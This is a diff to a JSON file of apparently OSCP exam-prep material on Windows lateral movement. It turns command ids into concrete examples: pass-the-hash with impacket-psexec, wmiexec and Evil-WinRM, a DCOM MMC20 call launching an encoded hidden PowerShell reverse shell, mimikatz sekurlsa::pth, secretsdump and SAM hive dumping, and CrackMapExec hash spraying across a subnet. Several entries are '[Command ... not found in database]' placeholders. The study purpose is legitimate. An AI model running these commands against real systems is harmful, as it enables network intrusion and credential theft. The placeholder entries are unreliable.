@@ -23,12 +23,12 @@
         {
           "title": "Scenario 1: Decision Tree - Which Lateral Movement Technique to Use?",
           "context": "You have domain credentials (corp\\jsmith:Password123) and nmap scan shows target 192.168.50.100 with ports 135, 139, 445, 5985 open. You need to decide: WMI, WinRM, PSExec, or DCOM? Each has different requirements, advantages, and failure modes. Making the wrong choice wastes exam time.",
-          "approach": "Use decision tree based on: (1) What ports are open? (2) What tools do you have available (Kali vs. compromised Windows machine)? (3) Do you need interactive shell or one-shot command execution? (4) Do you have password or just hash? (5) How stealthy do you need to be? Follow this priority order for OSCP: WinRM (easiest, interactive) → PSExec (most reliable, SYSTEM access) → WMI (fileless, stealthy) → DCOM (fallback when others blocked).",
+          "approach": "Use decision tree based on: (1) What ports are open? (2) What tools do you have available (Kali vs. compromised Windows machine)? (3) Do you need interactive shell or one-shot command execution? (4) Do you have password or just hash? (5) How stealthy do you need to be? Follow this priority order for OSCP: WinRM (easiest, interactive) \u2192 PSExec (most reliable, SYSTEM access) \u2192 WMI (fileless, stealthy) \u2192 DCOM (fallback when others blocked).",
           "commands": [
             "lateral-movement-decision-tree",
             "lateral-movement-port-check"
           ],
-          "expected_outcome": "Decision tree output: Port 5985 open → WinRM available → Try Evil-WinRM first (best interactive shell). If WinRM fails (service disabled despite port open, authentication failure), fall back to: Port 445 open → Try PSExec (most reliable). If PSExec fails (File and Printer Sharing disabled, service creation blocked), try: Port 135 open → Try WMI (works if Windows Firewall allows). If WMI fails (RPC blocked, WMI service disabled), final fallback: Port 135 open → Try DCOM (MMC20.Application). Decision tree saves 10-15 minutes of trial-and-error in exam.",
+          "expected_outcome": "Decision tree output: Port 5985 open \u2192 WinRM available \u2192 Try Evil-WinRM first (best interactive shell). If WinRM fails (service disabled despite port open, authentication failure), fall back to: Port 445 open \u2192 Try PSExec (most reliable). If PSExec fails (File and Printer Sharing disabled, service creation blocked), try: Port 135 open \u2192 Try WMI (works if Windows Firewall allows). If WMI fails (RPC blocked, WMI service disabled), final fallback: Port 135 open \u2192 Try DCOM (MMC20.Application). Decision tree saves 10-15 minutes of trial-and-error in exam.",
           "why_this_works": "Each lateral movement technique has specific port and service requirements: WinRM (5985/5986, WinRM service enabled), PSExec (445, File and Printer Sharing + Admin$ accessible), WMI (135 + ephemeral high ports, WMI service enabled), DCOM (135 + ephemeral high ports, DCOM enabled). By checking ports first, you eliminate techniques that will definitely fail. By trying techniques in priority order (interactive > reliable > stealthy > obscure), you maximize success rate. This systematic approach beats randomly trying commands."
         },
         {
@@ -52,8 +52,8 @@
             "psexec-impacket-shell",
             "psexec-sysinternals"
           ],
-          "expected_outcome": "CrackMapExec output: 'SMB 192.168.50.75 445 WORKSTATION [+] .\\administrator:Password123 (Pwn3d!) [+] Enumerated shares: ADMIN$ READ,WRITE'. Impacket PSExec output: '[*] Requesting shares on 192.168.50.75..... [*] Found writable share ADMIN$ [*] Uploading file yFqDNAzO.exe [*] Opening SVCManager on 192.168.50.75..... [*] Creating service ORfk on 192.168.50.75..... C:\\Windows\\system32>'. Run 'whoami' → 'nt authority\\system'. You have highest privilege level. Dump SAM: 'reg save HKLM\\SAM C:\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Temp\\system.hive'. Access any file, kill any process, load kernel drivers.",
-          "why_this_works": "PSExec (SysInternals tool, Impacket reimplementation) works by: (1) Connecting to ADMIN$ share over SMB (port 445), (2) Copying executable to ADMIN$ (C:\\Windows), (3) Using Service Control Manager (SCM) via RPC (port 135) to create Windows service, (4) Starting service which spawns cmd.exe. Service runs in LocalSystem context → SYSTEM shell. Requirements: SMB port 445 accessible, File and Printer Sharing enabled (Windows Firewall exception), user has local admin rights (can access ADMIN$ and create services). PSExec is most reliable technique because: creates minimal artifacts (service logs), works on all Windows versions, provides SYSTEM immediately, well-documented behavior. Disadvantages: writes binary to disk (forensics), creates service event logs (Windows Event ID 7045), easier to detect than WMI."
+          "expected_outcome": "CrackMapExec output: 'SMB 192.168.50.75 445 WORKSTATION [+] .\\administrator:Password123 (Pwn3d!) [+] Enumerated shares: ADMIN$ READ,WRITE'. Impacket PSExec output: '[*] Requesting shares on 192.168.50.75..... [*] Found writable share ADMIN$ [*] Uploading file yFqDNAzO.exe [*] Opening SVCManager on 192.168.50.75..... [*] Creating service ORfk on 192.168.50.75..... C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have highest privilege level. Dump SAM: 'reg save HKLM\\SAM C:\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Temp\\system.hive'. Access any file, kill any process, load kernel drivers.",
+          "why_this_works": "PSExec (SysInternals tool, Impacket reimplementation) works by: (1) Connecting to ADMIN$ share over SMB (port 445), (2) Copying executable to ADMIN$ (C:\\Windows), (3) Using Service Control Manager (SCM) via RPC (port 135) to create Windows service, (4) Starting service which spawns cmd.exe. Service runs in LocalSystem context \u2192 SYSTEM shell. Requirements: SMB port 445 accessible, File and Printer Sharing enabled (Windows Firewall exception), user has local admin rights (can access ADMIN$ and create services). PSExec is most reliable technique because: creates minimal artifacts (service logs), works on all Windows versions, provides SYSTEM immediately, well-documented behavior. Disadvantages: writes binary to disk (forensics), creates service event logs (Windows Event ID 7045), easier to detect than WMI."
         },
         {
           "title": "Scenario 4: WMI - Fileless Stealthy Execution (From Windows Machine)",
@@ -88,67 +88,155 @@
             "psexec-verify-firewall",
             "cme-smb-auth-test"
           ],
-          "expected_outcome": "CrackMapExec test output: '[-] corp\\user:Password123 STATUS_LOGON_FAILURE' → Credentials are wrong (typo, password expired, account locked). Fix: Verify credentials, try different account. Output: '[+] corp\\admin:P@ssw0rd (Pwn3d!)' but PSExec fails with 'Connection timeout' → Credentials work but firewall blocking SMB/RPC. Check nmap: 445 open but 135 filtered → File and Printer Sharing allowed, but RPC blocked → PSExec will fail (needs both), WinRM might work if 5985 open. Output: '[+] 192.168.50.75\\administrator:<HASH>' but PSExec gives 'Access denied' → Hash authentication works but not for local admin (UAC remote restrictions, MS14-068 patch blocks non-RID-500 local admin hashes over network). Fix: Try domain account hash or use RID-500 administrator account. Systematic troubleshooting cuts debugging time from 20 minutes to 2 minutes in exam.",
-          "why_this_works": "Lateral movement failures have distinct patterns: (1) Authentication failures (wrong creds, account disabled, NTLMv2 vs NTLMv1 mismatch) - test with CrackMapExec first, (2) Firewall blocks (ports filtered) - verify with nmap, (3) Service disabled (port open but service not listening) - WinRM port 5985 open doesn't guarantee WinRM service enabled, (4) UAC restrictions (2014 patch blocks local admin hashes except RID-500) - affects pass-the-hash attacks, (5) Group membership (user not in Remote Management Users for WinRM) - affects WinRM specifically. By testing in order (creds → ports → services → alternatives), you systematically eliminate possibilities. CrackMapExec is perfect for this - tests authentication separately from exploitation, gives clear [+]/[-] indicators, fast (2-3 seconds per test)."
+          "expected_outcome": "CrackMapExec test output: '[-] corp\\user:Password123 STATUS_LOGON_FAILURE' \u2192 Credentials are wrong (typo, password expired, account locked). Fix: Verify credentials, try different account. Output: '[+] corp\\admin:P@ssw0rd (Pwn3d!)' but PSExec fails with 'Connection timeout' \u2192 Credentials work but firewall blocking SMB/RPC. Check nmap: 445 open but 135 filtered \u2192 File and Printer Sharing allowed, but RPC blocked \u2192 PSExec will fail (needs both), WinRM might work if 5985 open. Output: '[+] 192.168.50.75\\administrator:<HASH>' but PSExec gives 'Access denied' \u2192 Hash authentication works but not for local admin (UAC remote restrictions, MS14-068 patch blocks non-RID-500 local admin hashes over network). Fix: Try domain account hash or use RID-500 administrator account. Systematic troubleshooting cuts debugging time from 20 minutes to 2 minutes in exam.",
+          "why_this_works": "Lateral movement failures have distinct patterns: (1) Authentication failures (wrong creds, account disabled, NTLMv2 vs NTLMv1 mismatch) - test with CrackMapExec first, (2) Firewall blocks (ports filtered) - verify with nmap, (3) Service disabled (port open but service not listening) - WinRM port 5985 open doesn't guarantee WinRM service enabled, (4) UAC restrictions (2014 patch blocks local admin hashes except RID-500) - affects pass-the-hash attacks, (5) Group membership (user not in Remote Management Users for WinRM) - affects WinRM specifically. By testing in order (creds \u2192 ports \u2192 services \u2192 alternatives), you systematically eliminate possibilities. CrackMapExec is perfect for this - tests authentication separately from exploitation, gives clear [+]/[-] indicators, fast (2-3 seconds per test)."
         }
       ],
       "sections": [
         {
           "title": "Phase 1: Reconnaissance - Which Techniques Are Available?",
-          "notes": "Before attempting lateral movement, identify which ports are open and which services are enabled on target. This determines which techniques will work. Quick port check with nmap -p 135,139,445,3389,5985,5986 -Pn -v <TARGET>. Port 5985/5986 open → WinRM possible. Port 445 open → PSExec/SMB possible. Port 135 open → WMI/DCOM possible. Port 3389 open → RDP possible (not lateral movement but useful for interactive access).",
+          "notes": "Before attempting lateral movement, identify which ports are open and which services are enabled on target. This determines which techniques will work. Quick port check with nmap -p 135,139,445,3389,5985,5986 -Pn -v <TARGET>. Port 5985/5986 open \u2192 WinRM possible. Port 445 open \u2192 PSExec/SMB possible. Port 135 open \u2192 WMI/DCOM possible. Port 3389 open \u2192 RDP possible (not lateral movement but useful for interactive access).",
           "commands": [
-            "lateral-movement-port-check",
-            "cme-smb-auth-test",
-            "cme-winrm"
+            {
+              "id": "lateral-movement-port-check",
+              "example": "sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v 192.168.50.73",
+              "shows": "135/tcp open  msrpc (Microsoft RPC)"
+            },
+            {
+              "id": "cme-smb-auth-test",
+              "example": "[Command cme-smb-auth-test not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "cme-winrm",
+              "example": "crackmapexec winrm 192.168.1.1 -u administrator -p Password123",
+              "shows": "Credentials found or hash cracked"
+            }
           ]
         },
         {
           "title": "Phase 2: Primary Technique Selection (WinRM or PSExec)",
           "notes": "For OSCP, prioritize: (1) WinRM from Kali (if port 5985/5986 open and you have password or hash) - provides best interactive shell. (2) PSExec from Kali (if port 445 open and you have local admin creds) - provides SYSTEM shell immediately. These two techniques cover 80% of OSCP lateral movement scenarios. WinRM advantages: interactive PowerShell, file transfer, stable. PSExec advantages: SYSTEM privileges, works on all Windows versions, most documented.",
           "commands": [
-            "evil-winrm-creds",
-            "evil-winrm-hash",
-            "psexec-impacket-shell",
-            "cme-smb-shares"
+            {
+              "id": "evil-winrm-creds",
+              "example": "evil-winrm -i 192.168.50.73 -u jen -p 'Nexus123!'",
+              "shows": "Evil-WinRM shell v3"
+            },
+            {
+              "id": "evil-winrm-hash",
+              "example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
+              "shows": "Evil-WinRM shell v3"
+            },
+            {
+              "id": "psexec-impacket-shell",
+              "example": "impacket-psexec corp.com/administrator:Nexus123!@192.168.50.73",
+              "shows": "[*] Requesting shares on <TARGET>"
+            },
+            {
+              "id": "cme-smb-shares",
+              "example": "crackmapexec smb 192.168.50.73 -u administrator -p Nexus123! --shares",
+              "shows": "[+] <DOMAIN>\\<USER>:<PASS> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 3: Alternative Techniques (WMI, DCOM)",
           "notes": "When WinRM and PSExec fail (services disabled, firewall rules, GPO restrictions), fall back to: (1) WMI - If you have access to compromised Windows machine with PowerShell. Fileless execution, stealthier than PSExec. Use Invoke-WmiMethod or wmic.exe. (2) DCOM - If WMI service disabled but RPC port 135 open. MMC20.Application COM object provides remote command execution. Both require port 135 (RPC) accessible.",
           "commands": [
-            "wmi-invoke-wmimethod",
-            "wmic-process-create",
-            "dcom-mmc20-revshell",
-            "dcom-verify-rpc-port"
+            {
+              "id": "wmi-invoke-wmimethod",
+              "example": "[Command wmi-invoke-wmimethod not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "wmic-process-create",
+              "example": "[Command wmic-process-create not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "dcom-mmc20-revshell",
+              "example": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...\",\"7\")",
+              "shows": "Netcat listener receives connection"
+            },
+            {
+              "id": "dcom-verify-rpc-port",
+              "example": "Test-NetConnection 192.168.50.73 -Port 135",
+              "shows": "TcpTestSucceeded : True"
+            }
           ]
         },
         {
           "title": "Phase 4: Authentication Methods (Password, Hash, Ticket)",
           "notes": "Lateral movement tools support multiple authentication types: (1) Password - Works with all tools (WinRM, PSExec, WMI, DCOM). Easiest to use. (2) NTLM Hash - Pass-the-hash attacks work with: Impacket tools (psexec, wmiexec, smbexec), Evil-WinRM (-H flag), CrackMapExec (-H flag). Requires hash in format: 32 hex characters (NTLM only, discard LM hash). (3) Kerberos Ticket - Pass-the-ticket or overpass-the-hash for tools requiring Kerberos (Microsoft PsExec, some COM objects). Most complex but enables certain Windows-native tools.",
           "commands": [
-            "pth-impacket-psexec",
-            "pth-impacket-wmiexec",
-            "evil-winrm-hash",
-            "overpass-mimikatz-pth"
+            {
+              "id": "pth-impacket-psexec",
+              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[*] Requesting shares on <TARGET>"
+            },
+            {
+              "id": "pth-impacket-wmiexec",
+              "example": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[*] SMBv3.0 dialect used"
+            },
+            {
+              "id": "evil-winrm-hash",
+              "example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
+              "shows": "Evil-WinRM shell v3"
+            },
+            {
+              "id": "overpass-mimikatz-pth",
+              "example": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell",
+              "shows": "user : <USER>"
+            }
           ]
         },
         {
           "title": "Phase 5: Post-Exploitation (Credential Harvesting for Further Lateral Movement)",
           "notes": "After successful lateral movement and gaining shell on target, immediately dump credentials for further movement: (1) SAM hashes - reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive. Parse with secretsdump. (2) LSASS memory - Upload Mimikatz, run sekurlsa::logonpasswords. (3) Cached domain credentials - secretsdump -security -sam -system. (4) Spray obtained hashes - Use CrackMapExec to test hashes against entire subnet: crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --local-auth. Identify all machines where hash is reused.",
           "commands": [
-            "secretsdump-hashes",
-            "mimikatz-logonpasswords",
-            "pth-cme-spray"
+            {
+              "id": "secretsdump-hashes",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
+            },
+            {
+              "id": "mimikatz-logonpasswords",
+              "example": "[Command mimikatz-logonpasswords not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "pth-cme-spray",
+              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <TARGET> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 6: Troubleshooting Common Failures",
           "notes": "Common failures and fixes: (1) STATUS_LOGON_FAILURE - Credentials wrong, test with CrackMapExec first. (2) Connection timeout - Firewall blocking ports, verify with nmap. (3) Access denied (credentials work but technique fails) - Service disabled or UAC blocking. Try alternative technique. (4) Hash doesn't work but password does - UAC remote restrictions (MS14-068 patch). Use domain account hash instead of local admin. (5) WinRM port open but connection fails - WinRM service might be disabled despite port being open (rare but happens). Try PSExec. (6) All techniques fail - Check if target is Windows (not Linux), verify network connectivity (ping -c 1 <TARGET>), confirm credentials are for correct domain (DOMAIN\\user vs user@DOMAIN.com).",
           "commands": [
-            "lateral-movement-troubleshooting",
-            "psexec-verify-firewall",
-            "cme-smb-auth-test",
-            "lateral-movement-decision-tree"
+            {
+              "id": "lateral-movement-troubleshooting",
+              "example": "# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password\n# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares\n# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100\n# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows\n# Time sync: net time \\\\192.168.45.100 (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100",
+              "shows": "[+] Pwn3d! from CrackMapExec (admin access confirmed)"
+            },
+            {
+              "id": "psexec-verify-firewall",
+              "example": "sudo nmap -p 445,135 -Pn -sV -v 192.168.50.73",
+              "shows": "445/tcp open  microsoft-ds"
+            },
+            {
+              "id": "cme-smb-auth-test",
+              "example": "[Command cme-smb-auth-test not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "lateral-movement-decision-tree",
+              "example": "[Command lateral-movement-decision-tree not found in database]",
+              "shows": "See command documentation"
+            }
           ]
         }
       ],
